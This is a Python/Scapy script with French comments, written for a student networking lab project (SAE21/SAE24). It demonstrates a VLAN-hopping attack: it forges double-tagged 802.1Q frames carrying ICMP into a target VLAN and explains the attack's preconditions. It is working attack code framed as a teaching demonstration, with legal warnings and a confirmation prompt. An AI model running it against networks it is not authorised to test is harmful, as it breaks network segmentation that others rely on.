#!/usr/bin/env python3
"""
vlan_hopping_double_tag.py
-----------------------------
Démonstration pédagogique d'une attaque VLAN Hopping par DOUBLE TAGGING,
réalisée dans le cadre du projet pépinière SAE21/SAE24.

⚠️ USAGE STRICTEMENT LIMITÉ À TA PROPRE MAQUETTE PÉDAGOGIQUE.
   Ne JAMAIS utiliser cet outil sur un réseau qui ne t'appartient pas
   ou sans autorisation explicite (cadre légal : article 323-1 du code pénal).

PRINCIPE :
Cette attaque ne fonctionne QUE si :
  1. L'attaquant est branché sur un port en mode ACCESS appartenant
     au VLAN NATIF du trunk (souvent VLAN 1 par défaut sur Cisco).
  2. Le VLAN natif n'a pas été changé/sécurisé par l'administrateur.
La trame envoyée porte DEUX tags 802.1Q empilés :
  - Le tag extérieur = VLAN natif (sera retiré sans vérification par
    le premier switch, car les trames du VLAN natif ne sont normalement
    pas taguées sur le port trunk).
  - Le tag intérieur = VLAN CIBLE (sera lu par le switch suivant, qui
    fera suivre la trame vers ce VLAN).
C'est une attaque UNIDIRECTIONNELLE : l'attaquant peut injecter du
trafic dans le VLAN cible, mais ne recevra jamais de réponse directe
par ce chemin (la réponse de la victime repart normalement, sans
repasser par l'attaquant).

PRÉREQUIS :
    pip install scapy --break-system-packages
    (lancer en root/sudo, nécessaire pour envoyer des trames brutes)

USAGE :
    sudo python3 vlan_hopping_double_tag.py
"""

from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, get_if_list
import sys

# ──────────────────────────────────────────────────────────────
# CONFIGURATION : à adapter à TA maquette précisément
# ──────────────────────────────────────────────────────────────

INTERFACE = "eth0"          # Interface réseau de la machine attaquante (vérifie avec `ip a`)
NATIVE_VLAN = 1              # VLAN natif du trunk visé (vérifie avec `show interfaces trunk` côté switch)
TARGET_VLAN = 105            # VLAN cible que l'on veut atteindre (ex: VLAN 105 = Caméra, selon ton schéma)
TARGET_IP = "192.168.165.10" # Une IP existante dans le VLAN cible (ex: une caméra ou un serveur)
ATTACKER_MAC = None          # None = Scapy utilise la MAC réelle de l'interface
PAYLOAD_MESSAGE = "Test VLAN hopping - SAE21/24"


def check_interface(iface: str):
    """Vérifie que l'interface existe avant de tenter quoi que ce soit."""
    available = get_if_list()
    if iface not in available:
        print(f"✗ Interface '{iface}' introuvable.")
        print(f"Interfaces disponibles : {available}")
        sys.exit(1)


def build_double_tagged_packet():
    """
    Construit la trame à double tag :
      Ethernet -> Dot1Q (VLAN natif, tag extérieur) -> Dot1Q (VLAN cible, tag intérieur) -> IP -> ICMP
    """
    frame = (
        Ether(src=ATTACKER_MAC) /
        Dot1Q(vlan=NATIVE_VLAN) /         # Tag extérieur : VLAN natif (sera "mangé" sans vérif)
        Dot1Q(vlan=TARGET_VLAN) /         # Tag intérieur : VLAN cible (sera lu par le 2e switch)
        IP(dst=TARGET_IP) /
        ICMP() /
        PAYLOAD_MESSAGE.encode()
    )
    return frame


def send_attack(iface: str, frame, count: int = 5):
    """Envoie la trame forgée plusieurs fois sur l'interface donnée."""
    print(f"\n→ Envoi de {count} trame(s) en double tagging vers VLAN {TARGET_VLAN} ({TARGET_IP})")
    print(f"  Tag extérieur (natif) : VLAN {NATIVE_VLAN}")
    print(f"  Tag intérieur (cible) : VLAN {TARGET_VLAN}")
    print(f"  Interface : {iface}\n")

    sendp(frame, iface=iface, count=count, verbose=True)

    print("\n✓ Trames envoyées.")
    print("  Rappel : cette attaque est UNIDIRECTIONNELLE.")
    print("  Pour confirmer la réussite, lance une capture Wireshark/tcpdump")
    print(f"  directement sur un appareil du VLAN {TARGET_VLAN} et vérifie")
    print("  si la trame ICMP y est bien arrivée, malgré l'isolation VLAN.")


def main():
    print("=" * 60)
    print(" DÉMONSTRATION VLAN HOPPING - DOUBLE TAGGING")
    print(" Projet Pépinière SAE21/SAE24")
    print("=" * 60)

    check_interface(INTERFACE)

    frame = build_double_tagged_packet()
    print("\nRésumé de la trame construite :")
    frame.show()

    confirm = input("\nConfirmer l'envoi sur TA propre maquette ? (oui/non) : ").strip().lower()
    if confirm != "oui":
        print("Annulé.")
        return

    send_attack(INTERFACE, frame, count=5)


if __name__ == "__main__":
    main()
